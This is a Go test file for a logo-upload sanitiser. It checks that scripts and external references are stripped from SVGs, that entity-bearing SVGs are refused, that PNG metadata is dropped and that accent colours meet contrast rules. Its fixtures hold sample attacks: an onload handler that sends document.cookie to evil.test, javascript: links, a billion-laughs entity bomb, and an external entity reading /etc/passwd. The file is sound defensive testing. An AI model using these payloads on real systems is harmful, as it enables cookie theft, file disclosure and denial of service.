package brand

import (
	"bytes"
	"encoding/binary"
	"hash/crc32"
	"image"
	"image/color"
	"image/png"
	"math"
	"strconv"
	"strings"
	"testing"
)

// G4-099: an SVG logo with a script and an external reference is made safe, and its shapes are kept.
// req: FR-ORG-09
// req: G4-099
// asvs: V1.3.4
func TestAHostileSVGLogoIsMadeSafe(t *testing.T) {
	hostile := `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
     viewBox="0 0 132 28" onload="fetch('https://evil.test/'+document.cookie)" inkscape:version="1.3">
  <!-- made with a tool -->
  <style>@import url(https://fonts.evil.test/font.css); rect { fill: red }</style>
  <script>alert(1)</script>
  <defs><linearGradient id="g"><stop offset="0" stop-color="#0F766E"/></linearGradient></defs>
  <rect x="0" y="0" width="28" height="28" rx="7" fill="url(#g)" onclick="steal()"
        style="fill:url(https://evil.test/x.svg#p);stroke:#000;behavior:url(x.htc)"/>
  <a href="javascript:alert(2)"><path d="M18.5 9.2a6.6 6.6 0 1 0 0 9.6" fill="none" stroke="#fff"/></a>
  <image href="https://evil.test/tracker.png" width="1" height="1"/>
  <use xlink:href="https://evil.test/sprite.svg#icon"/>
  <use href="#g"/>
  <foreignObject><div xmlns="http://www.w3.org/1999/xhtml">Hi</div></foreignObject>
  <text x="34" y="19" font-family="Inter" fill="#111">Cognizhi</text>
</svg>`
	c, err := SanitiseSVG([]byte(hostile))
	if err != nil {
		t.Fatal(err)
	}
	out := string(c.Data)
	for _, gone := range []string{"script", "alert", "onload", "onclick", "evil.test", "@import", "foreignObject", "<image", "javascript:",
		"behavior", "inkscape", "<style", "<!--", "<a "} {
		if strings.Contains(out, gone) {
			t.Errorf("the cleaned SVG still holds %q:\n%s", gone, out)
		}
	}
	for _, kept := range []string{`<svg xmlns="http://www.w3.org/2000/svg"`, `viewBox="0 0 132 28"`, `<rect`, `fill="url(#g)"`, `style="stroke:#000"`,
		`<path d="M18.5 9.2a6.6 6.6 0 1 0 0 9.6"`, `<use href="#g">`, `>Cognizhi</text>`, `<linearGradient id="g">`} {
		if !strings.Contains(out, kept) {
			t.Errorf("the cleaned SVG lost %q:\n%s", kept, out)
		}
	}
	if !c.Removed.Any() || c.Removed.Elements["script"] != 1 || c.Removed.Elements["style"] != 1 || c.Removed.Elements["image"] != 1 ||
		c.Removed.Elements["foreignObject"] != 1 || c.Removed.External < 3 {
		t.Errorf("what was removed: %+v", c.Removed)
	}
	if again, err := SanitiseSVG(c.Data); err != nil || !bytes.Equal(again.Data, c.Data) || again.Removed.Any() {
		t.Errorf("cleaning the cleaned SVG changed it: %v %+v", err, again.Removed)
	}
}

// An SVG that declares a document type or entities (a billion-laughs bomb, an external entity), that is not an SVG,
// or that is too large or deep, is refused; nothing in it is read.
// req: FR-ORG-09
// req: G4-099
// asvs: V1.5.1, V5.2.1, V5.2.2
func TestASVSWithEntitiesOrNoShapeIsRefused(t *testing.T) {
	deep := "<svg xmlns='http://www.w3.org/2000/svg'>" + strings.Repeat("<g>", MaxDepth+1) + strings.Repeat("</g>", MaxDepth+1) + "</svg>"
	for name, in := range map[string]string{
		"a billion laughs":   `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]><svg xmlns="http://www.w3.org/2000/svg">&b;</svg>`,
		"an external entity": `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&x;</svg>`,
		"HTML":               `<html><body><svg xmlns="http://www.w3.org/2000/svg"/></body></html>`,
		"broken XML":         `<svg xmlns="http://www.w3.org/2000/svg"><g></svg>`,
		"too deep":           deep,
		"too large":          "<svg xmlns='http://www.w3.org/2000/svg'>" + strings.Repeat(" ", MaxSVG) + "</svg>",
		"not a file kind":    "GIF89a…",
	} {
		_, err := Check(Light, []byte(in))
		var e *Error
		if err == nil || !errorsAs(err, &e) {
			t.Errorf("%s: %v", name, err)
		}
	}
}

// A PNG logo is decoded and written again without its metadata; one too small, too large or not square for the icon is
// refused.
// req: FR-ORG-09
// asvs: V5.2.2, V5.2.6
func TestAPNGLogoIsReadAndWrittenAgain(t *testing.T) {
	pngOf := func(w, h int) []byte {
		img := image.NewRGBA(image.Rect(0, 0, w, h))
		img.Set(1, 1, color.RGBA{15, 118, 110, 255})
		var b bytes.Buffer
		if err := png.Encode(&b, img); err != nil {
			t.Fatal(err)
		}
		// an ancillary text chunk before IEND, which the clean copy drops
		data := b.Bytes()
		body := []byte("tEXtnote\x00private")
		chunk := binary.BigEndian.AppendUint32(nil, uint32(len(body)-4))
		chunk = binary.BigEndian.AppendUint32(append(chunk, body...), crc32.ChecksumIEEE(body))
		return append(append(data[:len(data)-12:len(data)-12], chunk...), data[len(data)-12:]...)
	}
	c, err := Check(Light, pngOf(600, 200))
	if err != nil || c.MediaType != "image/png" || bytes.Contains(c.Data, []byte("tEXt")) {
		t.Fatalf("a PNG logo: %v %s", err, c.MediaType)
	}
	if p, err := Size(c.Data); err != nil || p != image.Pt(600, 200) {
		t.Errorf("its size: %v %v", p, err)
	}
	for name, x := range map[string]struct {
		kind Kind
		data []byte
	}{
		"a logo too narrow":  {Light, pngOf(300, 100)},
		"an icon not square": {Icon, pngOf(300, 200)},
		"an icon too small":  {Icon, pngOf(100, 100)},
		"a PNG too large":    {Light, pngOf(MaxPNGSide+1, 10)},
	} {
		if _, err := Check(x.kind, x.data); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}
	if _, err := Check(Icon, pngOf(256, 256)); err != nil {
		t.Errorf("a square icon: %v", err)
	}
}

// Each accent option reads against white at 4.5:1 or more, none is violet, and nothing else is accepted.
// req: FR-ORG-09
// req: NFR-A11Y-01
func TestTheAccentOptionsAreContrastChecked(t *testing.T) {
	for _, c := range Accents {
		if AccentNames[c] == "" {
			t.Errorf("%s has no name", c)
		}
		if r := contrastWithWhite(c); r < 4.5 {
			t.Errorf("%s has %.2f:1 with white", c, r)
		}
	}
	if got, err := CheckAccent("#0f766e"); err != nil || got != "#0F766E" {
		t.Errorf("a listed accent: %q %v", got, err)
	}
	for _, bad := range []string{"#7C3AED", "#FFFF00", "red", "#0F766"} {
		if _, err := CheckAccent(bad); err == nil {
			t.Errorf("%s was accepted", bad)
		}
	}
}

func contrastWithWhite(hex string) float64 {
	lum := func(i int) float64 {
		v, _ := strconv.ParseUint(hex[1+2*i:3+2*i], 16, 8)
		c := float64(v) / 255
		if c <= 0.04045 {
			return c / 12.92
		}
		return math.Pow((c+0.055)/1.055, 2.4)
	}
	l := 0.2126*lum(0) + 0.7152*lum(1) + 0.0722*lum(2)
	return 1.05 / (l + 0.05)
}

func errorsAs(err error, target **Error) bool {
	e, ok := err.(*Error)
	if ok {
		*target = e
	}
	return ok
}
